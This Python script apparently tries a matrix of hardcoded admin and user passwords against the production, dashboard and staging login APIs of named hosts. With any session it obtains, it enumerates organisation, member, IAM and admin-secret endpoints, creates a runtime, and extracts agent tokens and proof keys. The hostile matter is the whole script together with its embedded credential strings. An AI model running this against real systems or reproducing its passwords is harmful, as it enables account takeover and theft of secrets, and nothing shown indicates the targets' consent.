#!/usr/bin/env python3
# i28832: password-login matrix against prod assistant / dashboard with real web_account creds
#   + /api/me verification + (if admin session) read-only enum + runtime creation
import os, sys, json, time, base64, subprocess, re, random, string, tempfile

HOST_PROD = "assistant.lumiiai.cn"
HOST_DASH = "dashboard.lumiiai.cn"
HOST_STAGE = "stage-assistant.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
T0 = time.time()
OUT = "/tmp/i28832"; os.makedirs(OUT, exist_ok=True)
_h = [0]

def el(): return int(time.time() - T0)
def b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, b64(s)), flush=True)

def curl(args, timeout=40):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def req(host, method, path, body=None, cookie=None, timeout=40, extra=None):
    """returns dict(code, body, setcookie, hdr)"""
    hdrf = os.path.join(OUT, "h.%d" % _h[0]); _h[0] += 1
    bodyf = os.path.join(OUT, "b.%d" % _h[0])
    url = "https://%s%s" % (host, path)
    args = ["--http2", "-A", UA, "-D", hdrf, "-o", bodyf,
            "-H", "Accept: application/json, text/plain, */*",
            "-H", "Accept-Language: zh-CN,zh;q=0.9",
            "-H", "Referer: https://%s/" % host, "-H", "Origin: https://%s" % host,
            "-w", "%{http_code}"]
    if cookie:
        ck = cookie if "=" in cookie else "lumii_session=" + cookie
        args += ["-b", ck]
    if extra:
        for k, v in extra.items():
            args += ["-H", "%s: %s" % (k, v)]
    if body is not None:
        d = body if isinstance(body, str) else json.dumps(body)
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", d]
    elif method != "GET":
        args += ["-X", method]
    args.append(url)
    rc, out, err = curl(args, timeout=timeout)
    try:
        code = out.decode().strip()[:3]
    except Exception:
        code = ""
    try:
        b = open(bodyf, "rb").read().decode("utf-8", "replace")
    except Exception:
        b = ""
    sc = None; hdrtxt = ""
    try:
        hdrtxt = open(hdrf, "r", errors="replace").read()
        m = re.search(r"[Ss]et-[Cc]ookie:\s*lumii_session=([^;\r\n]+)", hdrtxt)
        if m: sc = m.group(1).strip()
    except Exception:
        pass
    return {"host": host, "path": path, "code": code, "body": b, "cookie": sc,
            "err": err.decode("utf-8", "replace")[:150], "hdr": hdrtxt[:1200]}

def jbody(r):
    try: return json.loads(r["body"])
    except Exception: return None

# ---------- phase 1: login matrix ----------
LOGIN_PATHS = ["/api/auth/login"]
PROD_ADMIN = ("admin@lumii-ai.cn", "admin@!v587")
STAGE_ADMIN = ("admin@lumii.dev", "admin123")
COMBOS = [
    ("PROD_ADMIN", "admin@lumii-ai.cn", "admin@!v587", None),
    ("PROD_ADMIN_local", "admin@lumii-ai.cn", "admin@!v587", True),
    ("PRODx_admin123", "admin@lumii-ai.cn", "admin123", None),
    ("PRODx_Lianchuang", "admin@lumii-ai.cn", "Lianchuang#2026", None),
    ("PRODx_TIANLU", "admin@lumii-ai.cn", "yPEJ03qBznHABHMj9ee", None),
    ("PRODx_JIANDING", "admin@lumii-ai.cn", "6xWX42TvoZbZIXwT9i1", None),
    ("PRODx_WJL", "admin@lumii-ai.cn", "qMT09mMlzonkcit73i", None),
    ("PRODx_PN", "admin@lumii-ai.cn", "oPCEuAE93c3t7owMtEnS1", None),
    ("PRODx_DSH", "admin@lumii-ai.cn", "V1TpoyEwH4wOrF4UIk1", None),
    ("PRODx_TRIAL", "admin@lumii-ai.cn", "5jOCDGONhex2RTPvrP1", None),
    ("PRODx_TRIAL2", "admin@lumii-ai.cn", "vnc6asPHyZ7BoQPVTD1", None),
    ("PRODx_LCowner", "admin@lumii-ai.cn", "Lc8443f84a05!", None),
    ("PRODx_satishpw", "admin@lumii-ai.cn", "correct-horse", None),
    ("STAGE_ADMIN_on_prod", "admin@lumii.dev", "admin123", None),
    ("admin_dev_prodpw", "admin@lumii.dev", "admin@!v587", None),
    ("lc-zone-leader", "lc-zone-leader@lumii.dev", "Lianchuang#2026", None),
    ("satish", "satish@lumii.dev", "correct-horse", None),
]
sessions = {}
matrix = []
for tag, ident, pw, local in COMBOS:
    body = {"identifier": ident, "password": pw}
    if local is not None: body["local"] = local
    r = req(HOST_PROD, "POST", "/api/auth/login", body)
    row = {"tag": tag, "ident": ident, "code": r["code"], "setcookie": bool(r["cookie"]),
           "body": r["body"][:180], "err": r["err"]}
    matrix.append(row)
    print("LOGIN %s %s -> %s cookie=%s %s" % (tag, ident, r["code"], bool(r["cookie"]), r["body"][:120]), flush=True)
    if r["code"] == "200" and r["cookie"]:
        sessions[tag] = {"cookie": r["cookie"], "ident": ident}
        me = req(HOST_PROD, "GET", "/api/me", cookie=r["cookie"])
        mj = jbody(me) or {}
        R("PROD_HIT_%s" % tag, {"login": row, "me_code": me["code"],
                                "id": mj.get("id"), "org": mj.get("org"), "orgName": mj.get("orgName"),
                                "name": mj.get("name"), "roleName": mj.get("roleName"),
                                "isEnterpriseOwner": mj.get("isEnterpriseOwner"),
                                "accountMode": mj.get("accountMode"),
                                "permissions": (mj.get("permissions") or [])[:40]})
    time.sleep(1.5)
R("PROD_MATRIX", matrix)

# ---------- phase 1b: dashboard ----------
dr = req(HOST_DASH, "GET", "/")
R("DASH_ROOT", {"code": dr["code"], "hdr": dr["hdr"][:400], "body": dr["body"][:300]})
dash_matrix = []
dashboard_paths = ["/api/auth/login", "/api/login", "/api/auth/signin", "/api/auth"]
for path in dashboard_paths:
    for tag, ident, pw in [("PROD_ADMIN", PROD_ADMIN[0], PROD_ADMIN[1]), ("STAGE_ADMIN", STAGE_ADMIN[0], STAGE_ADMIN[1]),
                           ("lc-zone-leader", "lc-zone-leader@lumii.dev", "Lianchuang#2026")]:
        if path != "/api/auth/login" and tag != "PROD_ADMIN":
            continue
        r = req(HOST_DASH, "POST", path, {"identifier": ident, "password": pw})
        dash_matrix.append({"path": path, "tag": tag, "code": r["code"], "setcookie": bool(r["cookie"]), "body": r["body"][:220]})
        print("DASH %s %s -> %s %s" % (path, tag, r["code"], r["body"][:100]), flush=True)
        if r["code"] == "200" and r["cookie"]:
            sessions["DASH_" + tag] = {"cookie": r["cookie"], "ident": ident}
            me = req(HOST_DASH, "GET", "/api/me", cookie=r["cookie"])
            mj = jbody(me) or {}
            R("DASH_HIT_%s" % tag, {"path": path, "me_code": me["code"], "me": mj if isinstance(mj, dict) else me["body"][:400]})
        time.sleep(1.5)
R("DASH_MATRIX", dash_matrix)

# ---------- phase 1c: stage control ----------
stage_rows = []
for tag, ident, pw in [("STAGE_ADMIN", "admin@lumii.dev", "admin123"),
                       ("lc-zone-leader", "lc-zone-leader@lumii.dev", "Lianchuang#2026"),
                       ("PROD_ADMIN_on_stage", "admin@lumii-ai.cn", "admin@!v587")]:
    r = req(HOST_STAGE, "POST", "/api/auth/login", {"identifier": ident, "password": pw})
    stage_rows.append({"tag": tag, "code": r["code"], "setcookie": bool(r["cookie"]), "body": r["body"][:180]})
    print("STAGE %s -> %s" % (tag, r["code"]), flush=True)
    if r["code"] == "200" and r["cookie"] and tag == "STAGE_ADMIN":
        sessions["STAGE_" + tag] = {"cookie": r["cookie"], "ident": ident}
    time.sleep(1.2)
R("STAGE_MATRIX", stage_rows)

# ---------- phase 2: read-only enum for whichever prod session worked ----------
prod_sess = None
for k, v in sessions.items():
    if k.startswith("PROD") or k.startswith("DASH") or k.startswith("STAGE"):
        prod_sess = (k, v); break

if prod_sess:
    k, v = prod_sess
    host = HOST_PROD if k.startswith("PROD") else (HOST_DASH if k.startswith("DASH") else HOST_STAGE)
    ck = v["cookie"]
    R("SESSION_USE", {"tag": k, "host": host, "cookie_len": len(ck)})
    enum_paths = ["/api/me", "/api/org", "/api/projects?limit=50", "/api/members?limit=10",
                  "/api/runtimes", "/api/approvals?status=pending&limit=20", "/api/integrations",
                  "/api/environment", "/api/admin/secrets", "/api/iam/assignments?limit=20"]
    for p in enum_paths:
        r = req(host, "GET", p, cookie=ck, timeout=35)
        R("ENUM_%s" % re.sub(r'[^A-Za-z0-9]+', '_', p)[:40], {"path": p, "code": r["code"], "body": r["body"][:1500]})
        time.sleep(0.6)
    # create runtime (own row only) to obtain perRuntime identity
    rr = req(host, "POST", "/api/runtimes", {"name": "rb28832-%d" % random.randint(1000, 9999)}, cookie=ck)
    rb = rr["body"]
    R("RUNTIME_CREATE", {"code": rr["code"], "body": rb[:4000]})
    mid = re.search(r"AGENT_ID='([^']+)'", rb); mtk = re.search(r"AGENT_TOKEN='([^']+)'", rb)
    rid = mid.group(1) if mid else ""
    rtoken = mtk.group(1) if mtk else ""
    if not rid:
        try:
            cj = json.loads(rb); rid = cj.get("id") or (cj.get("runtime") or {}).get("id") or ""
            rtoken = cj.get("token") or (cj.get("runtime") or {}).get("token") or ""
        except Exception: pass
    R("RUNTIME_IDS", {"id": rid, "has_token": bool(rtoken), "turn_secret_in_script": bool(re.search(r"TURN_PROOF_SECRET='?([0-9a-f]{32,})", rb))})
    if rid and rtoken:
        kk = req(host, "GET", "/api/runtimes/keys/current", extra={"x-agent-id": rid, "x-agent-token": rtoken})
        if kk["code"] != "200":
            kk = req(host, "GET", "/api/runtimes/keys/current", extra={"x-agent-id": rid, "Authorization": "Bearer " + rtoken})
        kj = jbody(kk) or {}
        R("RUNTIME_KEYS", {"code": kk["code"], "has_proof_key": bool(kj.get("proof_key")), "version": kj.get("proof_key_version"), "kids": [x.get("kid") for x in (kj.get("ticket_public_keys") or [])]})
R("DONE", {"t": el()})
